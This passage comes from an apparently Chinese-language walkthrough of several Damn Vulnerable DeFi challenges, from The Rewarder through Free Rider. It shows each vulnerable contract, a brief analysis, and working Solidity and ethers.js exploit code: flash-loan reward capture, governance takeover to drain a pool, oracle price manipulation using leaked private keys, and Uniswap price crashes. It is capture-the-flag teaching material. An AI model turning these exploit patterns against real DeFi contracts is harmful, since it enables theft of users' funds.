damnValuableToken;\n    FlashLoanerPool1 private immutable flashLoanpool;\n    TheRewarderPool1 private immutable rewarderPool;\n    RewardToken1 public immutable rewardToken;\n    address public attacker;\n\n    constructor (address tokenAddress, address flashLoanPoolAddress, address rewarderPoolAddress, address rewardTokenAddress, address attackerAddress) &#123;\n        damnValuableToken = DamnValuableToken1(tokenAddress);\n        flashLoanpool = FlashLoanerPool1(flashLoanPoolAddress);\n        rewarderPool = TheRewarderPool1(rewarderPoolAddress);\n        rewardToken = RewardToken1(rewardTokenAddress);\n        attacker = attackerAddress;\n    &#125;\n\n    function attack(uint256 amount) external &#123;\n        flashLoanpool.flashLoan(amount);\n    &#125;\n\n    // Take a flash loan of DVT, deposit to rewarder pool, call distributeRewards and collect reward, withdraw DVT\n    // send reward token to the attacker, return DVT\n    function receiveFlashLoan(uint256 amount) external &#123;\n        damnValuableToken.approve(address(rewarderPool), amount);\n        rewarderPool.deposit(amount);\n        rewarderPool.withdraw(amount);\n        rewardToken.transfer(attacker, rewardToken.balanceOf(address(this)));\n        damnValuableToken.transfer(msg.sender, amount);\n    &#125;\n&#125;\n\n\n\nconst RewarderAttackerfactory = await ethers.getContractFactory('RewarderAttacker', deployer);\n        const attackerContract = await RewarderAttackerfactory.deploy(\n            this.liquidityToken.address,\n            this.flashLoanPool.address,\n            this.rewarderPool.address,\n            this.rewardToken.address,\n            attacker.address\n        );\n        await ethers.provider.send(\"evm_increaseTime\", [5 * 24 * 60 * 60]); // wait 5 days\n        await attackerContract.connect(attacker).attack(TOKENS_IN_LENDER_POOL);\n\n\n\n6.Selfie\n\n\n\n\n\n\n\n\n题目要求：\nA new cool lending pool has launched! It’s now offering flash loans of DVT tokens.\nWow, and it even includes a really fancy governance mechanism to control it.\nWhat could go wrong, right ?\nYou start with no DVT tokens in balance, and the pool has 1.5 million. Your objective: take them all.\nSelfiePool code// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol\";\nimport \"@openzeppelin/contracts/utils/Address.sol\";\nimport \"./SimpleGovernance.sol\";\n\n/**\n * @title SelfiePool\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */\ncontract SelfiePool is ReentrancyGuard &#123;\n\n    using Address for address;\n\n    ERC20Snapshot public token;\n    SimpleGovernance public governance;\n\n    event FundsDrained(address indexed receiver, uint256 amount);\n\n    modifier onlyGovernance() &#123;\n        require(msg.sender == address(governance), \"Only governance can execute this action\");\n        _;\n    &#125;\n\n    constructor(address tokenAddress, address governanceAddress) &#123;\n        token = ERC20Snapshot(tokenAddress);\n        governance = SimpleGovernance(governanceAddress);\n    &#125;\n\n    function flashLoan(uint256 borrowAmount) external nonReentrant &#123;\n        uint256 balanceBefore = token.balanceOf(address(this));\n        require(balanceBefore >= borrowAmount, \"Not enough tokens in pool\");\n        \n        token.transfer(msg.sender, borrowAmount);        \n        \n        require(msg.sender.isContract(), \"Sender must be a deployed contract\");\n        msg.sender.functionCall(\n            abi.encodeWithSignature(\n                \"receiveTokens(address,uint256)\",\n                address(token),\n                borrowAmount\n            )\n        );\n        \n        uint256 balanceAfter = token.balanceOf(address(this));\n\n        require(balanceAfter >= balanceBefore, \"Flash loan hasn't been paid back\");\n    &#125;\n\n    function drainAllFunds(address receiver) external onlyGovernance &#123;\n        uint256 amount = token.balanceOf(address(this));\n        token.transfer(receiver, amount);\n        \n        emit FundsDrained(receiver, amount);\n    &#125;\n&#125;\n\nSimpleGovernance code// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"../DamnValuableTokenSnapshot.sol\";\nimport \"@openzeppelin/contracts/utils/Address.sol\";\n\n/**\n * @title SimpleGovernance\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */\ncontract SimpleGovernance &#123;\n\n    using Address for address;\n    \n    struct GovernanceAction &#123;\n        address receiver;\n        bytes data;\n        uint256 weiAmount;\n        uint256 proposedAt;\n        uint256 executedAt;\n    &#125;\n    \n    DamnValuableTokenSnapshot public governanceToken;\n\n    mapping(uint256 => GovernanceAction) public actions;\n    uint256 private actionCounter;\n    uint256 private ACTION_DELAY_IN_SECONDS = 2 days;\n\n    event ActionQueued(uint256 actionId, address indexed caller);\n    event ActionExecuted(uint256 actionId, address indexed caller);\n\n    constructor(address governanceTokenAddress) &#123;\n        require(governanceTokenAddress != address(0), \"Governance token cannot be zero address\");\n        governanceToken = DamnValuableTokenSnapshot(governanceTokenAddress);\n        actionCounter = 1;\n    &#125;\n    \n    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256) &#123;\n        require(_hasEnoughVotes(msg.sender), \"Not enough votes to propose an action\");\n        require(receiver != address(this), \"Cannot queue actions that affect Governance\");\n\n        uint256 actionId = actionCounter;\n\n        GovernanceAction storage actionToQueue = actions[actionId];\n        actionToQueue.receiver = receiver;\n        actionToQueue.weiAmount = weiAmount;\n        actionToQueue.data = data;\n        actionToQueue.proposedAt = block.timestamp;\n\n        actionCounter++;\n\n        emit ActionQueued(actionId, msg.sender);\n        return actionId;\n    &#125;\n\n    function executeAction(uint256 actionId) external payable &#123;\n        require(_canBeExecuted(actionId), \"Cannot execute this action\");\n        \n        GovernanceAction storage actionToExecute = actions[actionId];\n        actionToExecute.executedAt = block.timestamp;\n\n        actionToExecute.receiver.functionCallWithValue(\n            actionToExecute.data,\n            actionToExecute.weiAmount\n        );\n\n        emit ActionExecuted(actionId, msg.sender);\n    &#125;\n\n    function getActionDelay() public view returns (uint256) &#123;\n        return ACTION_DELAY_IN_SECONDS;\n    &#125;\n\n    /**\n     * @dev an action can only be executed if:\n     * 1) it's never been executed before and\n     * 2) enough time has passed since it was first proposed\n     */\n    function _canBeExecuted(uint256 actionId) private view returns (bool) &#123;\n        GovernanceAction memory actionToExecute = actions[actionId];\n        return (\n            actionToExecute.executedAt == 0 &amp;&amp;\n            (block.timestamp - actionToExecute.proposedAt >= ACTION_DELAY_IN_SECONDS)\n        );\n    &#125;\n    \n    function _hasEnoughVotes(address account) private view returns (bool) &#123;\n        uint256 balance = governanceToken.getBalanceAtLastSnapshot(account);\n        uint256 halfTotalSupply = governanceToken.getTotalSupplyAtLastSnapshot() / 2;\n        return balance > halfTotalSupply;\n    &#125;\n&#125;\n\nanalyze函数发现call调用并且data可控，猜测漏洞在此产生。\ndrainAllFunds()函数可以取走全部的dvt，但是函数限制onlyGovernance。所以只要通过令SimpleGovernance合约主动调用池子合约下的drainAllFunds()函数即可\n先通过falshloan()借出全部的token，从而满足_hasEnoughVotes()下的balance &gt; halfTotalSupply，但是在此之前要先调用token的snapshot()函数，否则再balance将会返回值0.\n调用queueAction()函数，设置receiver为pool合约，data为调用drainAllFunds(attacker)函数的abi编码。\n然后再调用executeAction()函数触发call调用。调用后将借出的token返还即可\nattackattackcontract\n\ninterface ERC20Snapshot1&#123;\n    function transfer(address,uint)external;\n&#125;\ninterface SelfiePool1&#123;\n    function flashLoan(uint)external;\n&#125;\ninterface SimpleGovernance1&#123;\n    function queueAction(address,bytes calldata ,uint)external returns(uint);\n&#125;\ninterface DamnValuableTokenSnapshot1&#123;\n    function snapshot()external;\n&#125;\ncontract SelfieAttacker &#123;\n\n    ERC20Snapshot1 public token;\n    SelfiePool1 private immutable pool;\n    SimpleGovernance1 private immutable governance;\n    address payable attacker;\n    uint256 public actionId;\n\n    constructor (address tokenAddress, address poolAddress, address governanceAddress, address attackerAddress) &#123;\n        token = ERC20Snapshot1(tokenAddress);\n        pool = SelfiePool1(poolAddress);\n        governance = SimpleGovernance1(governanceAddress);\n        attacker = payable(attackerAddress);\n    &#125;\n\n    function attack(uint256 amount) external &#123;\n        pool.flashLoan(amount);\n    &#125;\n\n    // Take the max amount of flash loan from the pool, take governance over, queue an action that drains all funds\n    // from the pool, advance 2 days in time, execute action\n    function receiveTokens(address tokenAddress, uint256 amount) external &#123;\n        DamnValuableTokenSnapshot1 governanceToken = DamnValuableTokenSnapshot1(tokenAddress);\n        governanceToken.snapshot();\n        actionId = governance.queueAction(address(pool), abi.encodeWithSignature(\"drainAllFunds(address)\",attacker), 0);\n        token.transfer(msg.sender, amount);\n    &#125;\n\n    receive() external payable &#123;&#125;\n&#125;\n\n\n\nconst SelfieAttackerFactory &#x3D; await ethers.getContractFactory(&#39;SelfieAttacker&#39;, deployer);\n       const attackerContract &#x3D; await SelfieAttackerFactory.deploy(this.token.address, this.pool.address, this.governance.address, attacker.address);\n       await attackerContract.connect(attacker).attack(TOKENS_IN_POOL);\n       const actionId &#x3D; ethers.BigNumber.from(await attackerContract.connect(attacker).actionId());\n       expect(actionId).to.be.gt(0);\n\n       await ethers.provider.send(&quot;evm_increaseTime&quot;, [2 * 24 * 60 * 60]); &#x2F;&#x2F; Advance in time 2 days\n       await this.governance.connect(attacker).executeAction(actionId);\n\n\n\n7.Compromised\n\n\n\n\n\n\n\n\n题目要求：\nWhile poking around a web service of one of the most popular DeFi projects in the space, you get a somewhat strange response from their server. This is a snippet:\nHTTP&#x2F;2 200 OK\ncontent-type: text&#x2F;html\ncontent-language: en\nvary: Accept-Encoding\nserver: cloudflare\n\n4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35\n\n4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34\n        \n\nA related on-chain exchange is selling (absurdly overpriced) collectibles called “DVNFT”, now at 999 ETH each\nThis price is fetched from an on-chain oracle, and is based on three trusted reporters: 0xA73209FB1a42495120166736362A1DfA9F95A105,0xe92401A4d3af5E446d93D11EEc806b1462b39D15 and 0x81A5D6E50C214044bE44cA0CB057fe119097850c.\nStarting with only 0.1 ETH in balance, you must steal all ETH available in the exchange.\nExchange code// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/utils/Address.sol\";\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\n\nimport \"./TrustfulOracle.sol\";\nimport \"../DamnValuableNFT.sol\";\n\n/**\n * @title Exchange\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */\ncontract Exchange is ReentrancyGuard &#123;\n\n    using Address for address payable;\n\n    DamnValuableNFT public immutable token;\n    TrustfulOracle public immutable oracle;\n\n    event TokenBought(address indexed buyer, uint256 tokenId, uint256 price);\n    event TokenSold(address indexed seller, uint256 tokenId, uint256 price);\n\n    constructor(address oracleAddress) payable &#123;\n        token = new DamnValuableNFT();\n        oracle = TrustfulOracle(oracleAddress);\n    &#125;\n\n    function buyOne() external payable nonReentrant returns (uint256) &#123;\n        uint256 amountPaidInWei = msg.value;\n        require(amountPaidInWei > 0, \"Amount paid must be greater than zero\");\n\n        // Price should be in [wei / NFT]\n        uint256 currentPriceInWei = oracle.getMedianPrice(token.symbol());\n        require(amountPaidInWei >= currentPriceInWei, \"Amount paid is not enough\");\n\n        uint256 tokenId = token.safeMint(msg.sender);\n        \n        payable(msg.sender).sendValue(amountPaidInWei - currentPriceInWei);\n\n        emit TokenBought(msg.sender, tokenId, currentPriceInWei);\n\n        return tokenId;\n    &#125;\n\n    function sellOne(uint256 tokenId) external nonReentrant &#123;\n        require(msg.sender == token.ownerOf(tokenId), \"Seller must be the owner\");\n        require(token.getApproved(tokenId) == address(this), \"Seller must have approved transfer\");\n\n        // Price should be in [wei / NFT]\n        uint256 currentPriceInWei = oracle.getMedianPrice(token.symbol());\n        require(address(this).balance >= currentPriceInWei, \"Not enough ETH in balance\");\n\n        token.transferFrom(msg.sender, address(this), tokenId);\n        token.burn(tokenId);\n        \n        payable(msg.sender).sendValue(currentPriceInWei);\n\n        emit TokenSold(msg.sender, tokenId, currentPriceInWei);\n    &#125;\n\n    receive() external payable &#123;&#125;\n&#125;\n\nTrustfulOracle code// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/access/AccessControlEnumerable.sol\";\n\n/**\n * @title TrustfulOracle\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n * @notice A price oracle with a number of trusted sources that individually report prices for symbols.\n *         The oracle's price for a given symbol is the median price of the symbol over all sources.\n */\ncontract TrustfulOracle is AccessControlEnumerable &#123;\n\n    bytes32 public constant TRUSTED_SOURCE_ROLE = keccak256(\"TRUSTED_SOURCE_ROLE\");\n    bytes32 public constant INITIALIZER_ROLE = keccak256(\"INITIALIZER_ROLE\");\n\n    // Source address => (symbol => price)\n    mapping(address => mapping (string => uint256)) private pricesBySource;\n\n    modifier onlyTrustedSource() &#123;\n        require(hasRole(TRUSTED_SOURCE_ROLE, msg.sender));\n        _;\n    &#125;\n\n    modifier onlyInitializer() &#123;\n        require(hasRole(INITIALIZER_ROLE, msg.sender));\n        _;\n    &#125;\n\n    event UpdatedPrice(\n        address indexed source,\n        string indexed symbol,\n        uint256 oldPrice,\n        uint256 newPrice\n    );\n\n    constructor(address[] memory sources, bool enableInitialization) &#123;\n        require(sources.length > 0);\n        for(uint256 i = 0; i &lt; sources.length; i++) &#123;\n            _setupRole(TRUSTED_SOURCE_ROLE, sources[i]);\n        &#125;\n\n        if (enableInitialization) &#123;\n            _setupRole(INITIALIZER_ROLE, msg.sender);\n        &#125;\n    &#125;\n\n    // A handy utility allowing the deployer to setup initial prices (only once)\n    function setupInitialPrices(\n        address[] memory sources,\n        string[] memory symbols,\n        uint256[] memory prices\n    ) \n        public\n        onlyInitializer\n    &#123;\n        // Only allow one (symbol, price) per source\n        require(sources.length == symbols.length &amp;&amp; symbols.length == prices.length);\n        for(uint256 i = 0; i &lt; sources.length; i++) &#123;\n            _setPrice(sources[i], symbols[i], prices[i]);\n        &#125;\n        renounceRole(INITIALIZER_ROLE, msg.sender);\n    &#125;\n\n    function postPrice(string calldata symbol, uint256 newPrice) external onlyTrustedSource &#123;\n        _setPrice(msg.sender, symbol, newPrice);\n    &#125;\n\n    function getMedianPrice(string calldata symbol) external view returns (uint256) &#123;\n        return _computeMedianPrice(symbol);\n    &#125;\n\n    function getAllPricesForSymbol(string memory symbol) public view returns (uint256[] memory) &#123;\n        uint256 numberOfSources = getNumberOfSources();\n        uint256[] memory prices = new uint256[](numberOfSources);\n\n        for (uint256 i = 0; i &lt; numberOfSources; i++) &#123;\n            address source = getRoleMember(TRUSTED_SOURCE_ROLE, i);\n            prices[i] = getPriceBySource(symbol, source);\n        &#125;\n\n        return prices;\n    &#125;\n\n    function getPriceBySource(string memory symbol, address source) public view returns (uint256) &#123;\n        return pricesBySource[source][symbol];\n    &#125;\n\n    function getNumberOfSources() public view returns (uint256) &#123;\n        return getRoleMemberCount(TRUSTED_SOURCE_ROLE);\n    &#125;\n\n    function _setPrice(address source, string memory symbol, uint256 newPrice) private &#123;\n        uint256 oldPrice = pricesBySource[source][symbol];\n        pricesBySource[source][symbol] = newPrice;\n        emit UpdatedPrice(source, symbol, oldPrice, newPrice);\n    &#125;\n\n    function _computeMedianPrice(string memory symbol) private view returns (uint256) &#123;\n        uint256[] memory prices = _sort(getAllPricesForSymbol(symbol));\n\n        // calculate median price\n        if (prices.length % 2 == 0) &#123;\n            uint256 leftPrice = prices[(prices.length / 2) - 1];\n            uint256 rightPrice = prices[prices.length / 2];\n            return (leftPrice + rightPrice) / 2;\n        &#125; else &#123;\n            return prices[prices.length / 2];\n        &#125;\n    &#125;\n\n    function _sort(uint256[] memory arrayOfNumbers) private pure returns (uint256[] memory) &#123;\n        for (uint256 i = 0; i &lt; arrayOfNumbers.length; i++) &#123;\n            for (uint256 j = i + 1; j &lt; arrayOfNumbers.length; j++) &#123;\n                if (arrayOfNumbers[i] > arrayOfNumbers[j]) &#123;\n                    uint256 tmp = arrayOfNumbers[i];\n                    arrayOfNumbers[i] = arrayOfNumbers[j];\n                    arrayOfNumbers[j] = tmp;\n                &#125;\n            &#125;\n        &#125;        \n        return arrayOfNumbers;\n    &#125;\n&#125;\n\n\n\nanalyze题目中的数字事十六进制，转字符串之后是字符串，进行base64解码得到私钥，分别对应account(0xe92401A4d3af5E446d93D11EEc806b1462b39D15)和account(0x81A5D6E50C214044bE44cA0CB057fe119097850c)。\n再exchange中发现价格来源于TrustfulOracle中的getMedianPrice。审计TrustfulOracle合约发现_ sort()函数进行三人价格排序，\n_computeMedianPrice()函数获得价格中位数。当前价格为[999,999,999]。\n我们分别使用两个账户调用postPrice()函数，将价格设置为0，价格变为[0,0,999],再购买一个nft。因为漏洞合约本来总共具有9999eth，所以再分别使用两个账户调用postPrice()函数，将价格设置为9990，价格变为[999,9990,9990],再卖出一个nft，即可获得巨大利润\nattacklet privateKey1 = \"0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9\";\n   let privateKey2 = \"0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48\";\n   let compromisedOracle1 = new ethers.Wallet(privateKey1, ethers.provider);\n   let compromisedOracle2 = new ethers.Wallet(privateKey2, ethers.provider);\n   await this.oracle.connect(compromisedOracle1).postPrice(\"DVNFT\", ethers.utils.parseEther(\"0\"));\n   await this.oracle.connect(compromisedOracle2).postPrice(\"DVNFT\", ethers.utils.parseEther(\"0\"));\n   const tx = await this.exchange.connect(attacker).buyOne(&#123; value: ethers.utils.parseEther(\"0.01\") &#125;);\n   await this.exchange.on(\"TokenBought\", async (sender, tokenId, currentPriceInWei) => &#123;\n   \tawait this.nftToken.connect(attacker).approve(this.exchange.address, tokenId);\n       await this.oracle.connect(compromisedOracle1).postPrice(\"DVNFT\", EXCHANGE_INITIAL_ETH_BALANCE);\n       await this.oracle.connect(compromisedOracle2).postPrice(\"DVNFT\", EXCHANGE_INITIAL_ETH_BALANCE);\n       await this.exchange.connect(attacker).sellOne(tokenId);\n       await this.oracle.connect(compromisedOracle1).postPrice(\"DVNFT\", INITIAL_NFT_PRICE);\n       await this.oracle.connect(compromisedOracle2).postPrice(\"DVNFT\", INITIAL_NFT_PRICE);\n        &#125;);\n   await tx.wait(2);\n\n\n\n8.Puppet\n\n\n\n\n\n\n\n\n题目要求：\nThere’s a huge lending pool borrowing Damn Valuable Tokens (DVTs), where you first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.\nThere’s a DVT market opened in an Uniswap v1 exchange, currently with 10 ETH and 10 DVT in liquidity.\nStarting with 25 ETH and 1000 DVTs in balance, you must steal all tokens from the lending pool.\ncode// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport \"@openzeppelin/contracts/utils/Address.sol\";\nimport \"../DamnValuableToken.sol\";\n\n/**\n * @title PuppetPool\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */\ncontract PuppetPool is ReentrancyGuard &#123;\n\n    using Address for address payable;\n\n    mapping(address => uint256) public deposits;\n    address public immutable uniswapPair;\n    DamnValuableToken public immutable token;\n    \n    event Borrowed(address indexed account, uint256 depositRequired, uint256 borrowAmount);\n\n    constructor (address tokenAddress, address uniswapPairAddress) &#123;\n        token = DamnValuableToken(tokenAddress);\n        uniswapPair = uniswapPairAddress;\n    &#125;\n\n    // Allows borrowing `borrowAmount` of tokens by first depositing two times their value in ETH\n    function borrow(uint256 borrowAmount) public payable nonReentrant &#123;\n        uint256 depositRequired = calculateDepositRequired(borrowAmount);\n        \n        require(msg.value >= depositRequired, \"Not depositing enough collateral\");\n        \n        if (msg.value > depositRequired) &#123;\n            payable(msg.sender).sendValue(msg.value - depositRequired);\n        &#125;\n\n        deposits[msg.sender] = deposits[msg.sender] + depositRequired;\n\n        // Fails if the pool doesn't have enough tokens in liquidity\n        require(token.transfer(msg.sender, borrowAmount), \"Transfer failed\");\n\n        emit Borrowed(msg.sender, depositRequired, borrowAmount);\n    &#125;\n\n    function calculateDepositRequired(uint256 amount) public view returns (uint256) &#123;\n        return amount * _computeOraclePrice() * 2 / 10 ** 18;\n    &#125;\n\n    function _computeOraclePrice() private view returns (uint256) &#123;\n        // calculates the price of the token in wei according to Uniswap pair\n        return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);\n    &#125;\n\n     /**\n     ... functions to deposit, redeem, repay, calculate interest, and so on ...\n     */\n\n&#125;\n\nanalyze_computeOraclePrice()函数中依靠的是外部合约的余额而制定价格，在uniswapPair中存在10eth以及10dvt。而这个比值也直接影响了在调用borrow()函数时的msg.value限制。\n所以我们可以在uniswapPair中大量卖出dvt，从而使dvt价格暴跌，在解出所有的dvt即可。\nattackawait this.token.connect(attacker).approve( this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);\n             const tx = await this.uniswapExchange.connect(attacker).tokenToEthSwapOutput(ethers.utils.parseEther('9.9'),\n                 ATTACKER_INITIAL_TOKEN_BALANCE,\n                 (await ethers.provider.getBlock('latest')).timestamp * 2,\n                 &#123; gasLimit: 1e6 &#125;\n             );\n             await tx.wait();\n             const depositRequired = await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);\n             expect(depositRequired &lt; ATTACKER_INITIAL_ETH_BALANCE).to.be.true;\n             await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, &#123;value: depositRequired&#125;)\n\n\n\n9.Puppet v2\n\n\n\n\n\n\n\n\n题目要求：\nThe developers of the last lending pool are saying that they’ve learned the lesson. And just released a new version!\nNow they’re using a Uniswap v2 exchange as a price oracle, along with the recommended utility libraries. That should be enough.\nYou start with 20 ETH and 10000 DVT tokens in balance. The new lending pool has a million DVT tokens in balance. You know what to do ;)\ncode// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\nimport \"@uniswap/v2-periphery/contracts/libraries/UniswapV2Library.sol\";\nimport \"@uniswap/v2-periphery/contracts/libraries/SafeMath.sol\";\n\ninterface IERC20 &#123;\n    function transfer(address to, uint256 amount) external returns (bool);\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\n    function balanceOf(address account) external returns (uint256);\n&#125;\n\n/**\n * @title PuppetV2Pool\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */\ncontract PuppetV2Pool &#123;\n    using SafeMath for uint256;\n\n    address private _uniswapPair;\n    address private _uniswapFactory;\n    IERC20 private _token;\n    IERC20 private _weth;\n    \n    mapping(address => uint256) public deposits;\n        \n    event Borrowed(address indexed borrower, uint256 depositRequired, uint256 borrowAmount, uint256 timestamp);\n\n    constructor (\n        address wethAddress,\n        address tokenAddress,\n        address uniswapPairAddress,\n        address uniswapFactoryAddress\n    ) public &#123;\n        _weth = IERC20(wethAddress);\n        _token = IERC20(tokenAddress);\n        _uniswapPair = uniswapPairAddress;\n        _uniswapFactory = uniswapFactoryAddress;\n    &#125;\n\n    /**\n     * @notice Allows borrowing `borrowAmount` of tokens by first depositing three times their value in WETH\n     *         Sender must have approved enough WETH in advance.\n     *         Calculations assume that WETH and borrowed token have same amount of decimals.\n     */\n    function borrow(uint256 borrowAmount) external &#123;\n        require(_token.balanceOf(address(this)) >= borrowAmount, \"Not enough token balance\");\n\n        // Calculate how much WETH the user must deposit\n        uint256 depositOfWETHRequired = calculateDepositOfWETHRequired(borrowAmount);\n        \n        // Take the WETH\n        _weth.transferFrom(msg.sender, address(this), depositOfWETHRequired);\n\n        // internal accounting\n        deposits[msg.sender] += depositOfWETHRequired;\n\n        require(_token.transfer(msg.sender, borrowAmount));\n\n        emit Borrowed(msg.sender, depositOfWETHRequired, borrowAmount, block.timestamp);\n    &#125;\n\n    function calculateDepositOfWETHRequired(uint256 tokenAmount) public view returns (uint256) &#123;\n        return _getOracleQuote(tokenAmount).mul(3) / (10 ** 18);\n    &#125;\n\n    // Fetch the price from Uniswap v2 using the official libraries\n    function _getOracleQuote(uint256 amount) private view returns (uint256) &#123;\n        (uint256 reservesWETH, uint256 reservesToken) = UniswapV2Library.getReserves(\n            _uniswapFactory, address(_weth), address(_token)\n        );\n        return UniswapV2Library.quote(amount.mul(10 ** 18), reservesToken, reservesWETH);\n    &#125;\n&#125;\n\nanalyze与上一题几乎相同，不过是交易对变了，并且需要存入3倍借贷金。\n在这道题目中看似价格计算方式发生了改变，但是引入UniswapV2Library.sol发现，quote()函数下和上一题计算方式大同小异\nfunction quote(uint amountA, uint reserveA, uint reserveB) internal pure returns (uint amountB) &#123;\n        require(amountA > 0, 'UniswapV2Library: INSUFFICIENT_AMOUNT');\n        require(reserveA > 0 &amp;&amp; reserveB > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');\n        amountB = amountA.mul(reserveB) / reserveA;\n    &#125;\n\n所以攻击思路相同，大量卖出dvt，使其价格暴跌，不过此时是在Uniswap v2中进行并且将交易对改变为weth和token，再解出全部的token即可。\nattackconst path = [];\n       path[0] = this.token.address;\n       path[1] = this.weth.address;\n       await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);\n       const timeStamp = (await ethers.provider.getBlock('latest')).timestamp + 1000;\n       const tx = await this.uniswapRouter.connect(attacker).swapExactTokensForETH(\n           ATTACKER_INITIAL_TOKEN_BALANCE, 10000, path, attacker.address, timeStamp,\n           &#123; gasLimit: 1e6 &#125;\n           );\n       await tx.wait();\n       let attackerETHBalance = await ethers.provider.getBalance(attacker.address);\n       let attackerETHBalanceMinusGasCost = attackerETHBalance.sub(ethers.utils.parseEther('0.1'));\n       expect(\n           await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)\n       ).to.be.lt(attackerETHBalanceMinusGasCost);\n       await this.weth.connect(attacker).deposit(&#123; value: attackerETHBalanceMinusGasCost, gasLimit: 1e5&#125;);\n       await this.weth.connect(attacker).approve(this.lendingPool.address, attackerETHBalanceMinusGasCost);\n       const tx2 = await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);\n       await tx2.wait();\n\n\n\n10.Free rider\n\n\n\n\n\n\n\n\n题目要求：\nA new marketplace of Damn Valuable NFTs has been released! There’s been an initial mint of 6 NFTs, which are available for sale in the marketplace. Each one at 15 ETH.\nA buyer has shared with you a secret alpha: the marketplace is vulnerable and all tokens can be taken. Yet the buyer doesn’t know how to do it. So it’s offering a payout of 45 ETH for whoever is willing to take the NFTs out and send them their way.\nYou want to build some rep with this buyer, so you’ve agreed with the plan.\nSadly you only have 0.5 ETH in balance. If only there was a place where you could get free ETH, at least for an instant.\nFreeRiderNFTMarketplace code// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/utils/Address.sol\";\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport \"../DamnValuableNFT.sol\";\n\n/**\n * @title FreeRiderNFTMarketplace\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */\ncontract FreeRiderNFTMarketplace is ReentrancyGuard &#123;\n\n    using Address for address payable;\n\n    DamnValuableNFT public token;\n    uint256 public amountOfOffers;\n\n    // tokenId -> price\n    mapping(uint256 => uint256) private offers;\n\n    event NFTOffered(address indexed offerer, uint256 tokenId, uint256 price);\n    event NFTBought(address indexed buyer, uint256 tokenId, uint256 price);\n    \n    constructor(uint8 amountToMint) payable &#123;\n        require(amountToMint &lt; 256, \"Cannot mint that many tokens\");\n        token = new DamnValuableNFT();\n\n        for(uint8 i = 0; i &lt; amountToMint; i++) &#123;\n            token.safeMint(msg.sender);\n        &#125;        \n    &#125;\n\n    function offerMany(uint256[] calldata tokenIds, uint256[] calldata prices) external nonReentrant &#123;\n        require(tokenIds.length > 0 &amp;&amp; tokenIds.length == prices.length);\n        for (uint256 i = 0; i &lt; tokenIds.length; i++) &#123;\n            _offerOne(tokenIds[i], prices[i]);\n        &#125;\n    &#125;\n\n    function _offerOne(uint256 tokenId, uint256 price) private &#123;\n        require(price > 0, \"Price must be greater than zero\");\n\n        require(\n            msg.sender == token.ownerOf(tokenId),\n            \"Account offering must be the owner\"\n        );\n\n        require(\n            token.getApproved(tokenId) == address(this) ||\n            token.isApprovedForAll(msg.sender, address(this)),\n            \"Account offering must have approved transfer\"\n        );\n\n        offers[tokenId] = price;\n\n        amountOfOffers++;\n\n        emit NFTOffered(msg.sender, tokenId, price);\n    &#125;\n\n    function buyMany(uint256[] calldata tokenIds) external payable nonReentrant &#123;\n        for (uint256 i = 0; i &lt; tokenIds.length; i++) &#123;\n            _buyOne(tokenIds[i]);\n        &#125;\n    &#125;\n\n    function _buyOne(uint256 tokenId) private &#123;       \n        uint256 priceToPay = offers[tokenId];\n        require(priceToPay > 0, \"Token is not being offered\");\n\n        require(msg.value >= priceToPay, \"Amount paid is not enough\");\n\n        amountOfOffers--;\n\n        // transfer from seller to buyer\n        token.safeTransferFrom(token.ownerOf(tokenId), msg.sender, tokenId);\n\n        // pay seller\n        payable(token.ownerOf(tokenId)).sendValue(priceToPay);\n\n        emit NFTBought(msg.sender, tokenId, priceToPay);\n    &#125;    \n\n    receive() external payable 